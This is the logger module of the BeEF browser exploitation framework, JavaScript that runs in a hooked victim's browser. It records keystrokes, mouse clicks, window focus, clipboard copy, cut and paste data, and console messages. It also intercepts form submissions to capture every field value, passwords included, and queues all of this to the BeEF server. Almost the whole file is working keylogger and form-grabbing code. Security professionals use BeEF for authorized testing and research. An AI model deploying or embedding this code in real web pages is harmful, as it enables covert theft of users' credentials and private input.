//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Provides logging capabilities.
 * @namespace beef.logger
 */
beef.logger = {
	
	running: false,
    /**
    * Internal logger id
    */
    id: 0,
	/**
	 * Holds events created by user, to be sent back to BeEF
	 */
	events: [],
	/**
	 * Holds current stream of key presses
	 */
	stream: [],
	/**
	 * Contains current target of key presses
	 */
	target: null,
	/**
	 * Holds the time the logger was started
	 */
	time: null,
    /**
    * Holds the event details to be sent to BeEF
    */
    e: function() {
        this.id = beef.logger.get_id();
        this.time = beef.logger.get_timestamp();
        this.type = null;
        this.x = 0;
        this.y = 0;
        this.target = null;
        this.data = null;
        this.mods = null;
    },
    /**
     * Prevents from recursive event handling on form submission
     */
    in_submit: false,
	
	/**
	 * Starts the logger
	 */
	start: function() {

		beef.browser.hookChildFrames();
		this.running = true;
		var d = new Date();
		this.time = d.getTime();

        $j(document).off('keypress');
        $j(document).off('click');
        $j(window).off('focus');
        $j(window).off('blur');
        $j('form').off('submit');
        $j(document.body).off('copy');
        $j(document.body).off('cut');
        $j(document.body).off('paste');

        if (!!window.console && typeof window.console == "object") {
          try {
            var oldInfo = window.console.info;
            console.info = function (message) {
              beef.logger.console('info', message);
              oldInfo.apply(console, arguments);
            };
            var oldLog = window.console.log;
            console.log = function (message) {
              beef.logger.console('log', message);
              oldLog.apply(console, arguments);
            };
            var oldWarn = window.console.warn;
            console.warn = function (message) {
              beef.logger.console('warn', message);
              oldWarn.apply(console, arguments);
            };
            var oldDebug = window.console.debug;
            console.debug = function (message) {
              beef.logger.console('debug', message);
              oldDebug.apply(console, arguments);
            };
            var oldError = window.console.error;
            console.error = function (message) {
              beef.logger.console('error', message);
              oldError.apply(console, arguments);
            };
         } catch(e) {}
       }

		$j(document).keypress(
			function(e) { beef.logger.keypress(e); }
		).click(
			function(e) { beef.logger.click(e); }
		);
		$j(window).focus(
			function(e) { beef.logger.win_focus(e); }
		).blur(
			function(e) { beef.logger.win_blur(e); }
		);
		$j('form').submit(
			function(e) { 
                beef.logger.submit(e); 
            }
		);
		$j(document.body).on('copy', function() {
			setTimeout("beef.logger.copy();", 10);
		});
		$j(document.body).on('cut', function() {
			setTimeout("beef.logger.cut();", 10);
		});
		$j(document.body).on('paste', function() {
			beef.logger.paste();
		});
	},
	
	/**
	 * Stops the logger
	 */
	stop: function() {
		this.running = false;
		clearInterval(this.timer);
        $j(document).off('keypress');
        $j(document).off('click');
        $j(window).off('focus');
        $j(window).off('blur');
        $j('form').off('submit');
        $j(document.body).off('copy');
        $j(document.body).off('cut');
        $j(document.body).off('paste');
        // TODO: reset console
	},

    /**
    * Get id
    */
    get_id: function() {
        this.id++;
        return this.id;
    },

	/**
	 * Click function fires when the user clicks the mouse.
	 */
	click: function(e) {
        var c = new beef.logger.e();
        c.type = 'click';
        c.x = e.pageX;
        c.y = e.pageY;
        c.target = beef.logger.get_dom_identifier(e.target);
        this.events.push(c);
	},
	
	/**
	 * Fires when the window element has regained focus
	 */
	win_focus: function(e) {
        var f = new beef.logger.e();
        f.type = 'focus';
        this.events.push(f);
	},
	
	/**
	 * Fires when the window element has lost focus
	 */
	win_blur: function(e) {
        var b = new beef.logger.e();
        b.type = 'blur';
		this.events.push(b);
	},
	
	/**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
	keypress: function(e) {
		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
		{
			beef.logger.push_stream();
			this.target = e.target;
		}
		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
	},
	
	/**
	 * Copy function fires when the user copies data to the clipboard.
	 */
	copy: function(x) {
		try {
			var c = new beef.logger.e();
			c.type = 'copy';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Cut function fires when the user cuts data to the clipboard.
	 */
	cut: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'cut';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

        /**
         * Console function fires when data is sent to the browser console.
         */
        console: function(type, message) {
		try {
			var c = new beef.logger.e();
			c.type = 'console';
			c.data = type + ': ' + message;
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Paste function fires when the user pastes data from the clipboard.
	 */
	paste: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'paste';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Submit function fires whenever a form is submitted
     * TODO: Cleanup this function
	 */
	submit: function(e) {
        if (beef.logger.in_submit) {
            return true;
        }
		try {
			var f = new beef.logger.e();
			f.type = 'submit';
			f.target = beef.logger.get_dom_identifier(e.target);
            var jqForms = $j(e.target);
            var values = jqForms.find('input').map(function() { 
                    var inp = $j(this);    
                    return inp.attr('name') + '=' + inp.val(); 
                }).get().join();
            beef.debug('submitting form inputs: ' + values);
            /*
			for (var i = 0; i < e.target.elements.length; i++) {
	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
	        }
            */
			f.data = 'Action: '+jqForms.attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
			this.events.push(f);
            this.queue();
            this.target = null;
            beef.net.flush(function done() {
                beef.debug("Submitting the form");
                beef.logger.in_submit = true;
                jqForms.submit();
                beef.logger.in_submit = false;
                beef.debug("Done submitting");
            });
            e.preventDefault();
            return false;
		} catch(e) {}
	},
	
	/**
	 * Pushes the current stream to the events queue
	 */
	push_stream: function() {
		if (this.stream.length > 0)
		{
			this.events.push(beef.logger.parse_stream());
			this.stream = [];
		}
	},
	
	/**
	 * Translate DOM Object to a readable string
	 */
	get_dom_identifier: function(target) {
		target = (target == null) ? this.target : target;
		var id = '';
		if (target)
		{
			id = target.tagName.toLowerCase();
			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
		}
		return id;
	},
	
	/**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
	get_timestamp: function() {
		var d = new Date();
		return ((d.getTime() - this.time) / 1000).toFixed(3);
	},
	
	/**
	 * Parses stream array and creates history string
	 */
	parse_stream: function() {
		var s = '';
        var mods = '';
		for (var i in this.stream){
         try{
            var mod = this.stream[i]['modifiers'];
            s += String.fromCharCode(this.stream[i]['char']);
            if(typeof mod != 'undefined' &&
                      (mod['alt'] == true ||
                      mod['ctrl'] == true ||
                      mod['shift'] == true)){
                mods += (mod['alt']) ? ' [Alt] ' : '';
                mods += (mod['ctrl']) ? ' [Ctrl] ' : '';
                mods += (mod['shift']) ? ' [Shift] ' : '';
                mods += String.fromCharCode(this.stream[i]['char']);
            }

         }catch(e){}
		}
        var k = new beef.logger.e();
        k.type = 'keys';
        k.target = beef.logger.get_dom_identifier();
        k.data = s;
        k.mods = mods;
        return k;
	},
	
	/**
	 * Queue results to be sent back to framework
	 */
	queue: function() {
		beef.logger.push_stream();
		if (this.events.length > 0)
		{
			beef.net.queue('/event', 0, this.events);
			this.events = [];
		}
	}
		
};

beef.regCmp('beef.logger');
